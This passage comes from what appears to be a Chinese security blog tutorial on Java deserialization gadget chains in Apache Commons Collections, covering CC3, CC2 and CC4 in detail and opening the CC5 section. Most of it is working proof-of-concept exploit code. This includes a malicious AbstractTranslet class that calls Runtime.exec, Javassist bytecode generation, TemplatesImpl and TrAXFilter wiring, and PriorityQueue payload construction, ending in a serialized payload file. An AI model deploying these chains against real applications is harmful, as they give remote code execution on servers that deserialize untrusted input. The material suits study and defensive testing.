class="operator">=</span> (InvocationHandler) constructor1.newInstance(Override.class,map);</span><br></pre></td></tr></table></figure>

<p>   到此，我们将invocationHandler1序列化之后，当反序列化这个数据流时，就会执行我们指定的任意命令。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled.png" alt="Untitled"></p>
<h2 id="二、CommonsCollection3链"><a href="#二、CommonsCollection3链" class="headerlink" title="二、CommonsCollection3链"></a>二、CommonsCollection3链</h2><p>  接下来看看CC3这条链，它是CC1链的一个改进版本，它使用了InstantiateTransformer类来替换InvokerTransformer。可以简单看看这个InstantiateTransformer.transform方法的具体实现：（其功能就是实例化一个对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure>

<p>  在CC3链中，会用到一个TemplateImpl类，这个类在Java反序列化中用的比较多，比如JDK7u21也会用到这个类，我们接下来简单分析一下该类的作用以及利用过程，这里直接给出利用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">	-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">		-&gt; TemplatesImpl.getTransletInstance()</span><br><span class="line">			-&gt; TemplatesImpl.defineTransletClasses()</span><br><span class="line">				-&gt; loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>

<p>  最终这条链利用的是defineClass来加载字节码从而达到任意命令执行的效果，在构建这个对象的时候，需要指定三个成员变量，分别为：_name、_bytecodes、_tfactory；其中_name和_tfactory的构造是为了最终能够执行到defineClass函数，而_bytecodes是真正的字节码部分。</p>
<p>  在TemplatesImpl.getTransletInstance方法中，需要指定_name为非空，从而跳过条件语句的执行，成功调用到TemplatesImpl.defineTransletClasses方法；在TemplatesImpl.defineTransletClasses方法中，需要设置_tfactory的值，让其调用getExternalExtensionsMap方法不出错就行。（有兴趣的话可以自己调试分析看看，这里就不说细节了）</p>
<p>  接下来我们要做的就是构造_bytecodes这个部分，这里也有一个限制，就是构造的恶意类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类（因为在调用defineClass后，程序会回到getTransletInstance方法中，在实例化之前，对传入的恶意类做了一个检测）；之后就是编写恶意类，并将其编译后的字节码信息传入这个变量了，这里有两种方式可以进行构造，一种是直接本地编译一个恶意类，然后读取字节码信息传入这个bytes数组；另一种方式是利用javassist来构造恶意类字节码。这里我用两种方式都尝试一下：</p>
<h3 id="1、编译成class文件，获取字节码信息"><a href="#1、编译成class文件，获取字节码信息" class="headerlink" title="1、编译成class文件，获取字节码信息"></a>1、编译成class文件，获取字节码信息</h3><p>  恶意类的编写如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  编译成class文件之后，获取字节码信息传给_bytecodes，调用newTransformer方法即可触发：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DataInputStream</span> <span class="variable">dataInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\Evil.class&quot;</span>)));</span><br><span class="line">        <span class="type">int</span> <span class="variable">available</span> <span class="operator">=</span> dataInputStream.available();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[available];</span><br><span class="line">        dataInputStream.read(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        object.newTransformer();</span><br></pre></td></tr></table></figure>

<h3 id="2、利用Javassist来构造字节码信息"><a href="#2、利用Javassist来构造字节码信息" class="headerlink" title="2、利用Javassist来构造字节码信息"></a>2、利用Javassist来构造字节码信息</h3><p>  上面是自定义了一个java文件，然后将其编译成class文件后，通过文件读取的方式获取字节码信息，从而传给_bytecodes成员变量；另外一种生成字节码的方式就是利用javassist，来动态生成相关字节码信息，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;public Evil() throws Exception&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(code,ctClass);    <span class="comment">//创建构造函数</span></span><br><span class="line">ctClass.addConstructor(constructor);</span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));  <span class="comment">//设置父类</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">object.newTransformer();</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>  在CC3链中，前面的部分和CC1一样，都是通过动态代理的方式，最终调用LazyMap.get方法来执行ChainedTransformer.transform方法；前面有说过，InstantiateTransformer.transform方法就是实例化一个对象（调用某个类的构造方法），因此查找链的思路就是寻找一个类，在其调用构造方法时候，会调用到TemplatesImpl.newTransformer方法或者TemplatesImpl.getOutputProperties方法，因此这里利用到com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类，可以看看这个类的构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">	_templates = templates;</span><br><span class="line">	_transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">	_transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">	_overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  这里调用了templates.newTransformer方法，我们只需要构造这个templates成员变量即可。所以，我们只需要修改ChainedTransformer中的内容即可；构造代码如下：（其中object为我们上面构造的TemplatesImpl实例对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br></pre></td></tr></table></figure>

<p>  当调用到chainedTransformer.transform方法后，就会执行恶意代码，最终完整的利用代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;public Evil() throws Exception&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(code,ctClass);    <span class="comment">//创建构造函数</span></span><br><span class="line">ctClass.addConstructor(constructor);</span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));  <span class="comment">//设置父类</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;</span><br><span class="line">         )</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"><span class="comment">// 创建一个动态代理对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor1.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代理对象封装到AnnotationInvocationHandler中</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor2.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:/cc3.poc&quot;</span>));</span><br><span class="line">objectOutputStream.writeObject(invocationHandler1);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:/cc3.poc&quot;</span>));</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%201.png" alt="Untitled"></p>
<h2 id="三、CommonsCollection2链"><a href="#三、CommonsCollection2链" class="headerlink" title="三、CommonsCollection2链"></a>三、CommonsCollection2链</h2><p>  在CC2链中，导入的是commons-collections4:4.0这个包。它最终利用到的也是TemplatesImpl来加载恶意字节码。因此我们只需要关注前面构造的部分，最终是如何调用到TemplatesImpl.newTransformer方法或者TemplatesImpl.getOutputProperties方法的。</p>
<p>  在TransformingComparator.compare方法中，调用了this.transformer.transform方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">	<span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">  <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  因此在向上追溯的时候，我们只需要关注哪个地方调用了compare方法。在CC2链中，反序列化的入口点选的是PriorityQueue这个类，从该类的readObject方法触发，通过调用heapify()→siftDownUsingComparator()→comparator.compare()，最终调用到TransformingComparator.compare方法，因此我们构造的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] objects = (Object[]) queue.get(priorityQueue);</span><br><span class="line">objects[<span class="number">0</span>] = object;</span><br><span class="line">objects[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">iMethod</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">iMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iMethod.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  这里调用add去添加元素，是为了构造size；另外在构造POC的时候，需要通过反射方式去改变InvokerTransformer中的iMethodName属性值，这是由于在调用add的时候，最终会执行到InvokerTransformer.transform方法，调用添加的那个元素的某个方法；（查看堆栈信息调用链可以了解到这部分内容）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%202.png" alt="Untitled"></p>
<h2 id="四、CommonsCollection4链"><a href="#四、CommonsCollection4链" class="headerlink" title="四、CommonsCollection4链"></a>四、CommonsCollection4链</h2><p>  CC4链是CC2链的变种，和CC3一样，它用InstantiateTransformer类来替换InvokerTransformer，然后配合前面说到的com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类，在调用了其构造方法之后，执行TemplatesImlp.newTransformer方法，从而加载恶意字节码信息。</p>
<p>  CC4链前半部分内容基本和CC2相似，反序列化的入口点都是PriorityQueue.readObject；只不过在CC2链中，是直接调用了InvokerTransformer.transform方法来执行TemplatesImlp.newTransformer，而在本条链中，我们需要借助ChainedTransformer方法；（这部分的构造和CC3链相似），因此可以构造如下代码：（理想情况下）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImp&#125;</span><br><span class="line">               )</span><br><span class="line">       &#125;</span><br><span class="line">);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  但是这样构造，在下面调用add函数的时候会出错；因此我们还是和上面一样，先构造一个正常的，然后在调用add函数之后，利用反射的方式去修改具体的值，最后的构造代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(constantTransformer,instantiateTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">iconstant</span> <span class="operator">=</span> constantTransformer.getClass().getDeclaredField(<span class="string">&quot;iConstant&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">iParam</span> <span class="operator">=</span> instantiateTransformer.getClass().getDeclaredField(<span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">iArgs</span> <span class="operator">=</span> instantiateTransformer.getClass().getDeclaredField(<span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line">iconstant.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iParam.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iArgs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">iconstant.set(constantTransformer, TrAXFilter.class);</span><br><span class="line">Object[] iparam = (Object[]) iParam.get(instantiateTransformer);</span><br><span class="line">Object[] iargs = (Object[]) iArgs.get(instantiateTransformer);</span><br><span class="line">iparam[<span class="number">0</span>] = Templates.class;</span><br><span class="line">iargs[<span class="number">0</span>] = templatesImp;</span><br></pre></td></tr></table></figure>

<h2 id="五、CommonsCollection5链"><a href="#五、CommonsCollection5链" class="headerlink" title="五、CommonsCollection5链"></a>五、CommonsCollection5链</h2><p>  CC5的利用有一定的限制，它要求JDK版本是8u76并且没有Security Manager；CC5的构造比较简单，核心利用的还是LazyMap，和CC1相同，只不过将反序列化的入口点更改了。</p>
